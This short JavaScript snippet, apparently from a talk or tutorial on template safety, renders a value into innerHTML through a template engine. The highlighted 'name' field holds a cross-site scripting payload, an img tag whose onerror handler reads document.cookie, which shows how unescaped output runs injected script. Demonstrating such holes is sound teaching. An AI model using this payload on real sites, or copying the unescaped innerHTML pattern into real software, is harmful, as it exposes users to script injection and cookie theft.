    var source   = "<h1 id={{id}}>{{name}}</h1>";
    el.innerHTML = TemplateEngine.render( source, {
        "name": "<img src=x onerror=alert(document.cookie)>",  // HL
        "id": "foo"
    });